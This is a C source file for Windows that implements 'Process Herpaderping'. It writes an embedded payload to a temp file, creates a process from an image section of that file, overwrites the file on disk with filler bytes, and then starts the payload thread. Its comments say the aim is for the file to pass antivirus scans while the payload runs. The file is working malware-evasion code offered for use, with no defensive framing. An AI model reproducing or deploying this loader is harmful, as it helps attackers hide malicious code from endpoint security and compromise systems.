#include <windows.h>
#include <stdio.h>
#include "../common/embedded_dll.h"

// Process Herpaderping Implementation:
// 1. Write payload PE into a normal on-disk file
// 2. Create image Section Object from this file via NtCreateSection(SEC_IMAGE)
// 3. Create process from section via NtCreateProcessEx
// 4. CRITICAL STEP: Overwrite file on disk with random bytes / benign PE BEFORE thread execution
// 5. Create and start the main thread via NtCreateThreadEx
// Result: File on disk passes AV scans / looks benign, while process runs original payload from mapped section

typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS (NTAPI *pfnNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS (NTAPI *pfnNtCreateProcessEx)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    ULONG JobMemberLevel
);

typedef NTSTATUS (NTAPI *pfnNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

int main() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pfnNtCreateSection NtCreateSection = (pfnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pfnNtCreateProcessEx NtCreateProcessEx = (pfnNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
    pfnNtCreateThreadEx NtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!NtCreateSection) return 1;

    char tempPath[MAX_PATH];
    char tempFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    GetTempFileNameA(tempPath, "hrp", 0, tempFile);

    // 1. Create file and write payload PE
    HANDLE hFile = CreateFileA(
        tempFile,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) return 1;

    DWORD written = 0;
    WriteFile(hFile, embedded_dll, embedded_dll_len, &written, NULL);

    // 2. Create image section object from the payload file
    HANDLE hSection = NULL;
    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hFile
    );

    if (status != STATUS_SUCCESS || !hSection) {
        CloseHandle(hFile);
        DeleteFileA(tempFile);
        return 1;
    }

    // 3. Create process from the section object
    HANDLE hProcess = NULL;
    if (NtCreateProcessEx) {
        status = NtCreateProcessEx(
            &hProcess,
            PROCESS_ALL_ACCESS,
            NULL,
            GetCurrentProcess(),
            0,
            hSection,
            NULL,
            NULL,
            0
        );
    }

    // 4. HERPADERPING: Overwrite the file on disk with benign/garbage content BEFORE running thread
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    char benignNoise[1024];
    memset(benignNoise, 0x41, sizeof(benignNoise)); // Pattern 'A'
    for (DWORD i = 0; i < embedded_dll_len; i += sizeof(benignNoise)) {
        WriteFile(hFile, benignNoise, sizeof(benignNoise), &written, NULL);
    }
    SetEndOfFile(hFile);
    CloseHandle(hFile);

    // File on disk now contains only 'A's, while hSection holds mapped payload!

    if (hProcess && NtCreateThreadEx) {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)embedded_dll;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(embedded_dll + dos->e_lfanew);
        PVOID entryPoint = (PVOID)(nt->OptionalHeader.ImageBase + nt->OptionalHeader.AddressOfEntryPoint);

        HANDLE hThread = NULL;
        status = NtCreateThreadEx(
            &hThread,
            THREAD_ALL_ACCESS,
            NULL,
            hProcess,
            entryPoint,
            NULL,
            0,
            0,
            0,
            0,
            NULL
        );
        if (hThread) {
            WaitForSingleObject(hThread, 5000);
            CloseHandle(hThread);
        }
        CloseHandle(hProcess);
    } else if (hProcess) {
        CloseHandle(hProcess);
    }

    CloseHandle(hSection);
    DeleteFileA(tempFile);
    return 0;
}
